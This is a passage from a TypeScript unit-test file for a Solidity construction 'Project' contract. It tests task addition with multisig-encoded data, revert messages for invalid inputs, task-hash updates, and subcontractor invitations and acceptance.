project.hashChangeNonce()).to.equal(oldHashChangeNonce.add(1));\n  });\n\n  // --- addTasks() ---\n  // TODO when called by dispute contract\n  it('should revert to add task with wrong _taskCount', async () => {\n    const hashArray = ['0x'];\n    const costArray = [taskCost];\n    const data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        (await project.taskCount()).toNumber() + 1,\n        project.address,\n      ],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n\n    const tx = project.addTasks(encodedData, signature);\n\n    await expect(tx).to.be.revertedWith('Project::!taskCount');\n  });\n\n  it('should revert to add task with wrong project address', async () => {\n    const hashArray = ['0x'];\n    const costArray = [taskCost];\n    const data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        await project.taskCount(),\n        signers[1].address,\n      ],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n\n    const tx = project.addTasks(encodedData, signature);\n\n    await expect(tx).to.be.revertedWith('Project::!projectAddress');\n  });\n\n  it('should revert to add task with wrong hash and cost length', async () => {\n    const hashArray = ['0x'];\n    const costArray = [taskCost, 1e9];\n    const data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        await project.taskCount(),\n        project.address,\n      ],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n\n    const tx = project.addTasks(encodedData, signature);\n\n    await expect(tx).to.be.revertedWith('Project::Lengths !match');\n  });\n\n  it('should revert add task if task cost if is under required precision', async () => {\n    const hashArray = ['0x'];\n    let costArray = [1e3 - 1];\n    let data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        await project.taskCount(),\n        project.address,\n      ],\n    };\n    let [encodedData, signature] = await multisig(data, [signers[0]]);\n\n    let tx: any = project.addTasks(encodedData, signature);\n    await expect(tx).to.be.revertedWith('Project::Precision>=1000');\n\n    costArray = [1e3];\n    data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        await project.taskCount(),\n        project.address,\n      ],\n    };\n    [encodedData, signature] = await multisig(data, [signers[0]]);\n    tx = project.callStatic.addTasks(encodedData, signature);\n    await expect(tx).to.not.be.revertedWith('Project::Precision>=1000');\n  });\n\n  it('should be able to add task', async () => {\n    const hashArray = ['0x'];\n    const costArray = [taskCost];\n    taskList.push(taskCost);\n    const data = {\n      types: ['bytes[]', 'uint256[]', 'uint256', 'address'],\n      values: [\n        hashArray,\n        costArray,\n        await project.taskCount(),\n        project.address,\n      ],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n\n    const tx = await project.addTasks(encodedData, signature);\n    await expect(tx)\n      .to.emit(project, 'TasksAdded')\n      .withArgs(costArray, hashArray);\n\n    expect(await project.taskCount()).to.equal(1);\n    const { cost, subcontractor, state } = await project.getTask(1);\n    expect(cost).to.equal(costArray[0]);\n    expect(subcontractor).to.equal(ethers.constants.AddressZero);\n    expect(state).to.equal(1);\n  });\n\n  it('should be able to change task hash with only B signature', async () => {\n    const hashChangeNonce = (await project.hashChangeNonce()).toNumber();\n    const taskID = 1;\n    const modifiedSampleBytes = '0x12';\n    const data = {\n      types: ['bytes', 'uint256', 'uint256'],\n      values: [modifiedSampleBytes, hashChangeNonce, taskID],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n    const tx = await project.updateTaskHash(encodedData, signature);\n    await expect(tx)\n      .to.emit(project, 'TaskHashUpdated')\n      .withArgs(taskID, modifiedSampleBytes);\n\n    expect(await project.hashChangeNonce()).to.equal(hashChangeNonce + 1);\n  });\n\n  // --- inviteSC() ---\n  it('should revert to invite SC with wrong sender', async () => {\n    const taskList = [1];\n    const scList = [signers[2].address];\n\n    const tx = project.connect(signers[2]).inviteSC(taskList, scList);\n\n    await expect(tx).to.be.revertedWith('Project::!Builder||!GC');\n  });\n\n  it('should revert to invite SC with 0 address', async () => {\n    const taskList = [1];\n    const scList = [ethers.constants.AddressZero];\n\n    const tx = project.inviteSC(taskList, scList);\n\n    await expect(tx).to.be.revertedWith('Project::0 address');\n  });\n\n  it('should revert to invite SC with mismatch length of task and sc', async () => {\n    const taskList = [1];\n    const scList = [signers[2].address, signers[2].address];\n\n    const tx = project.inviteSC(taskList, scList);\n\n    await expect(tx).to.be.revertedWith('Project::Lengths !match');\n  });\n\n  it('should be able to invite SC and accept invite', async () => {\n    const taskList = [1];\n    const scList = [signers[2].address];\n\n    const tx = await project.inviteSC(taskList, scList);\n\n    await expect(tx)\n      .to.emit(project, 'MultipleSCInvited')\n      .withArgs(taskList, scList);\n\n    const { subcontractor } = await project.getTask(1);\n    expect(subcontractor).to.equal(scList[0]);\n  });\n\n  // --- acceptInviteSC() ---\n  it('should revert to accept sc invite when sender !sc', async () => {\n    const taskID = 1;\n    const tx = project.connect(signers[0]).acceptInviteSC([taskID]);\n    await expect(tx).to.be.revertedWith('Task::!SC');\n  });\n\n  it('should be able to accept sc invite when task not funded', async () => {\n    const taskID = 1;\n    const tx = await project.connect(signers[2]).acceptInviteSC([taskID]);\n    await expect(tx).to.emit(project, 'SCConfirmed').withArgs([taskID]);\n    const getAlerts = await project.getAlerts(taskID);\n    expect(getAlerts[2]).to.equal(true);\n    const { state } = await project.get"
    }
  ]
}